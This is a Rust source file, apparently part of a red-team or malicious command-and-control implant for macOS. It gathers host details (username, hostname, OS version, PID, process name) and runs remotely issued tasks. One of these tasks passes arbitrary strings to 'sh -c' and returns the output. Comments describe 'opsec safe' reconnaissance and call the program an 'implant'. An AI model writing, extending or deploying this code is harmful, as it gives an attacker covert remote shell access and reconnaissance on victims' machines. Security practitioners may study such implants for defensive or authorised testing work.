use std::env;
extern crate libc;
use std::ffi::{CStr, CString};
use std::os::raw::c_char;
use std::process::Command;
use libc::{getpwuid, getuid, getpid};
use libc::{sysctlbyname, c_void};

//change get username to show hostname/username
pub fn get_username() -> String {
    //add error handling
    //env::var("USER").ok().unwrap()
    //can we use libc as a fallback
    let pw = unsafe { getpwuid(getuid()) };
    if pw.is_null() {
        panic!("Failed to get user information");
    }
    
    let username_cstr = unsafe { CStr::from_ptr((*pw).pw_name as *const c_char) };
    let username_str = username_cstr.to_string_lossy().into_owned();

    let hostname = get_hostname();

    format!("{}/{}", hostname, username_str)

    //username_str
}

pub fn get_hostname() -> String {
    let mut buf = [0u8; 64];
    unsafe {
        libc::gethostname(buf.as_mut_ptr() as *mut libc::c_char, buf.len());
        CStr::from_ptr(buf.as_ptr() as *const libc::c_char)
            .to_string_lossy()
            .into_owned()
    }
}

pub fn fake_get_external_ip() -> String {
    String::from("xxx.xxx.xxx.xxx")
}

pub fn get_version() -> String {
    let name = match CString::new("kern.osproductversion") {
        Ok(name) => name,
        Err(_) => return "Error: Failed to create CString".to_string(),
    };
    let mut size: libc::size_t = 0;

    let ret = unsafe {
        sysctlbyname(name.as_ptr(), std::ptr::null_mut(), &mut size, std::ptr::null_mut(), 0)
    };
    if ret != 0 {
        return "Error: sysctlbyname failed to get size".to_string();
    }

    let mut buf = vec![0u8; size];
    let ret = unsafe {
        sysctlbyname(name.as_ptr(), buf.as_mut_ptr() as *mut c_void, &mut size, std::ptr::null_mut(), 0)
    };
    if ret != 0 {
        return "Error: sysctlbyname failed to get value".to_string();
    }

    let version = unsafe {
        CStr::from_ptr(buf.as_ptr() as *const c_char)
            .to_string_lossy()
            .into_owned()
    };

    format!("MacOS {}", version)
}

pub fn get_pid() -> String {
    let pid = unsafe { libc::getpid() };
    pid.to_string()
}

pub fn get_process_name() -> String {
    let mut buf = [0u8; 1024];
    let ret = unsafe {
        libc::proc_name(libc::getpid(), buf.as_mut_ptr() as *mut libc::c_void, buf.len() as u32)
    };
    if ret <= 0 {
        return "Error: Failed to get process name".to_string();
    }

    let process_name = unsafe {
        CStr::from_ptr(buf.as_ptr() as *const c_char)
            .to_string_lossy()
            .into_owned()
    };

    process_name
}

pub fn run_tasks(tasks: String) -> String {
    let mut output = String::new();

    for task in tasks.split(',') {
        println!("[run_tasks] Received task: {}", task);
        //split arguments
        let arg_split = task.split(' ');
        let args = arg_split.collect::<Vec<&str>>();
        //match task.trim() {
        match args[0] {
            //uses the first argument to determine the task
            //not whoami in the terminal, but opsec safe version using dynamic loading of native functions
            "whoami" => {
                //output.push_str(&execute_whoami());
                //TODO, replace with a check that also gets privileges
                output.push_str(&get_username());
                //output.push_str(&format!("{}/{}", get_hostname(), get_username()));
            }
            //TODO: change to dir in server and then change to dir here
            "pwd" => {
                output.push_str(&get_cwd());
            }
            "ls" => {
                output.push_str(&list_files());
            }
            "sh" | "shell" => {
                //execute the shell function
                //this will execute the command in a mac terminal
                //and return the output
                output.push_str(&shell(args));
            }
            //add a function to kill the implant
            "kill" => {
                output.push_str("killing implant...");
                kill();
            }
            _ => {
                println!("[run_tasks] Unknown task: {}", task);
                output.push_str(&format!("Unknown task: {}\n", task));
            }
        }
    }

    //if !output.is_empty() {
    //  println!("[run_tasks] Task output: {}", output);
    //}

    output
}

fn kill () {
    //kill the process
    unsafe {
        libc::kill(libc::getpid(), libc::SIGKILL);
    }
}

// return current working directory
pub fn get_cwd() -> String {
    let cwd = env::current_dir().unwrap();
    cwd.to_str().unwrap().to_string()
}

//return list of files in current directory
pub fn list_files() -> String {
    let mut output = String::new();
    let paths = std::fs::read_dir(".").unwrap();
    for path in paths {
        let path = path.unwrap().path();
        output.push_str(&format!("{}\n", path.display()));
    }
    output
}

pub fn shell(args: Vec<&str>) -> String {
    //capture the command from the args, which is in the 2nd position
    if args.len() > 1 {
        //if the command is more than one word, join them
        let command = args[1..].join(" ");

        match Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output() {
            Ok(output) => {
                if !output.stderr.is_empty() {
                    return String::from_utf8_lossy(&output.stderr).to_string();
                }
                else {
                    return String::from_utf8_lossy(&output.stdout).to_string();
                }
            }
            Err(e) => {
                String::from("Command failed to execute")
            }
        }
    } else {
        "No command provided".to_string()
    }
}